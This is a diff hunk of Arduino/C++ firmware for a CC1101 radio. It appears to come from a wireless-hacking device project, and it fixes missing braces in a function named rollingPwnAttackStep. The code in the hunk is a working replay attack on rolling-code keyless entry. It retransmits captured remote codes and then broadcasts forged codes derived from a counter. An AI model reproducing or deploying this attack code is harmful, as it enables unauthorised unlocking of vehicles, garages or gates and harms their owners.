@@ -102,26 +102,28 @@ void rollingPwnAttackStep() {
       }
       break;
     case 1:
-      ELECHOUSE_cc1101.setSidle();
-      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
-      ELECHOUSE_cc1101.setModulation(0);
-      ELECHOUSE_cc1101.setPA(12);
-      ELECHOUSE_cc1101.SetTx();
-      delay(5);
-      pinMode(CC_GDO0, OUTPUT);
-      for (int i = 0; i < cc1101::capturedCodeCount; i++) {
-        transmitCode(cc1101::capturedCodes[i], 24, p);
-        delayMicroseconds(5000);
+      {
+        ELECHOUSE_cc1101.setSidle();
+        ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
+        ELECHOUSE_cc1101.setModulation(0);
+        ELECHOUSE_cc1101.setPA(12);
+        ELECHOUSE_cc1101.SetTx();
+        delay(5);
+        pinMode(CC_GDO0, OUTPUT);
+        for (int i = 0; i < cc1101::capturedCodeCount; i++) {
+          transmitCode(cc1101::capturedCodes[i], 24, p);
+          delayMicroseconds(5000);
+        }
+        for (int i = 0; i < 20; i++) {
+          uint32_t fakeCode = 0xFFFF00 | (cc1101::rollingPwnCounter + i);
+          transmitCode(fakeCode, 24, p);
+          delayMicroseconds(3000);
+        }
+        digitalWrite(CC_GDO0, LOW);
+        ELECHOUSE_cc1101.setSidle();
+        cc1101::rollingPwnStep = 2;
+        cc1101::rollingPwnTimer = millis();
       }
-      for (int i = 0; i < 20; i++) {
-        uint32_t fakeCode = 0xFFFF00 | (cc1101::rollingPwnCounter + i);
-        transmitCode(fakeCode, 24, p);
-        delayMicroseconds(3000);
-      digitalWrite(CC_GDO0, LOW);
-      ELECHOUSE_cc1101.setSidle();
-      cc1101::rollingPwnStep = 2;
-      cc1101::rollingPwnTimer = millis();
-      
       break;
     case 2:
       if (millis() - cc1101::rollingPwnTimer > 2000) {
